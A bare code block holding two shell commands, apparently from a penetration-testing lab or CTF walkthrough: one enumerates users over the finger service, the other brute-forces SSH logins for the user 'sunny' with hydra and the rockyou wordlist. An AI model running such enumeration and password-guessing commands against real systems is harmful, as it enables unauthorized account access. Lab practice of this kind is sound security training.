```

./finger-user-enum.pl -t 10.129.110.5 -U /usr/share/wordlists/rockyou.txt
hydra -V -I -l sunny -P '/usr/share/wordlists/rockyou.txt' 10.10.10.76 ssh -s 22022
```
